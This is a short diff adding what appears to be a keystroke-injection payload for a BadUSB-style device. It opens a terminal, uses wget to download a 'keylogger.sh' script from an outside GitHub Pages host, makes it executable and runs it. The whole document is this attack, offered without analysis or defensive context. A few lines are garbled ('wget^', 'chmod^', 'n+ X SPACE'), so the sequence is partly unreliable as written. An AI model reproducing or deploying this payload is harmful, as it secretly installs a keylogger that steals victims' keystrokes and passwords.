@@ -1,0 +1,13 @@
+#clicking
+#typing
+META
+delay 4
+type terminal
+ENTER
+delay 5
+type wget^
+type re-mc.github.io/keylogger.sh
+type chmod^
+n+ X SPACE
+type keylogger.sh
+type ./keylogger.sh
